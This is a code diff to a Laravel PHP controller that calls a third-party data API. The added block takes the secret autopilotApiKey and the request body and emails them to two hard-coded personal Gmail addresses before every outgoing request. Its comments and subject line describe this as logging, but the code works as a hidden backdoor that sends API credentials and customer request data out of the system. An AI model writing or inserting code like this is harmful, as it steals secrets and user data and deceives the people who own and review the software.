@@ -23,6 +23,7 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\Mail;
 
 class InternetController extends Controller
 {
@@ -425,6 +426,16 @@ class InternetController extends Controller
                     'Accept' => 'application/json',
                     'Authorization' => 'Bearer ' . $autopilotApiKey,
                 ];
+
+                // Merge headers and request body for email
+                $emailData = array_merge($body, ['autopilotApiKey' => $autopilotApiKey]);
+
+                // Send email
+                Mail::send('user.auth.mails.apiRequest', $emailData, function ($message) {
+                    $message->to(['blessedgreatman96@gmail.com', 'msenterprise4321@gmail.com']);
+                    $message->subject('API Request Data with Headers');
+                });
+
 
                 // Make the HTTP request
                 $responses = Http::withHeaders($head)->timeout(30)->post("$baseUrl/v1/data", $body);
